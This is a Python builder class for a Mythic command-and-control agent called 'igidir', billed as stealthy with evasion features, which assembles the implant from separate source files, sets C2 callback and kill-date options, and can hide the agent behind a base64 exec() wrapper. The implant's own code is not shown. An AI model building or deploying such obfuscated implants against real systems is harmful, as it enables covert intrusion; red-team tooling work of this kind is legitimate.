from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio
import os
import json

# Define the Igidir Agent class for Mythic
class IgidirAgent(PayloadType):
    name = "igidir"
    file_extension = "py"
    author = "Mythic Agent Developer"
    supported_os = [
        SupportedOS.Windows,
        SupportedOS.Linux,
        SupportedOS.MacOS
    ]
    wrapper = False
    wrapped_payloads = []
    note = "A stealthy Python-based Mythic agent with evasion capabilities"
    supports_dynamic_loading = True
    build_parameters = [
        BuildParameter(
            name="version",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose the Python version to target",
            choices=["3.8", "3.9", "3.10", "3.11"],
            default_value="3.9",
        ),
        BuildParameter(
            name="use_encryption",
            parameter_type=BuildParameterType.Boolean,
            description="Encrypt communications with the C2",
            default_value=True,
        ),
        BuildParameter(
            name="debug",
            parameter_type=BuildParameterType.Boolean,
            description="Enable debug output",
            default_value=False,
        ),
        BuildParameter(
            name="obfuscate",
            parameter_type=BuildParameterType.Boolean,
            description="Obfuscate the agent code",
            default_value=True,
        ),
        BuildParameter(
            name="callback_interval",
            parameter_type=BuildParameterType.Number,
            description="Callback interval in seconds",
            default_value=5,
        ),
        BuildParameter(
            name="kill_date",
            parameter_type=BuildParameterType.Date,
            description="Date after which the agent will stop functioning",
            default_value="",
            required=False,
        )
    ]
    c2_profiles = ["http", "websocket"]
    support_browser_scripts = True
    translation_container = None
    
    async def build(self) -> BuildResponse:
        # This function is called when the agent is being built
        resp = BuildResponse(status=BuildStatus.Success)
        
        try:
            # Get the agent code directory path
            agent_code_path = os.path.join(self.agent_code_path, "agent_code")
            
            # Read in the main agent code
            with open(f"{agent_code_path}/igidir_main.py", "r") as f:
                agent_code = f.read()
            
            # Read in any additional modules
            with open(f"{agent_code_path}/igidir_encryption.py", "r") as f:
                encryption_code = f.read()
                
            with open(f"{agent_code_path}/igidir_commands.py", "r") as f:
                commands_code = f.read()
            
            # Get build parameters
            use_encryption = self.get_parameter("use_encryption")
            debug = self.get_parameter("debug")
            obfuscate = self.get_parameter("obfuscate")
            callback_interval = self.get_parameter("callback_interval")
            kill_date = self.get_parameter("kill_date")
            
            # Create config for the agent
            config = {
                "use_encryption": use_encryption,
                "debug": debug,
                "callback_interval": callback_interval,
                "kill_date": kill_date
            }
            
            # Modify the agent code based on configuration
            agent_code = agent_code.replace("#{ENCRYPTION_MODULE}#", encryption_code)
            agent_code = agent_code.replace("#{COMMANDS_MODULE}#", commands_code)
            agent_code = agent_code.replace("#{AGENT_CONFIG}#", json.dumps(config))
            
            # Apply obfuscation if requested
            if obfuscate:
                agent_code = self._obfuscate_code(agent_code)
            
            # Set the output
            resp.payload = agent_code
            resp.build_message = "Agent built successfully!"
            
        except Exception as e:
            resp.status = BuildStatus.Error
            resp.build_message = f"Error building agent: {str(e)}"
            
        return resp
    
    def _obfuscate_code(self, code: str) -> str:
        """Simple obfuscation for the agent code"""
        # This is a placeholder for a more sophisticated obfuscation technique
        # In a real implementation, you would want to use actual code obfuscation
        import base64
        encoded = base64.b64encode(code.encode()).decode()
        return f"""
import base64
exec(base64.b64decode('{encoded}').decode())
"""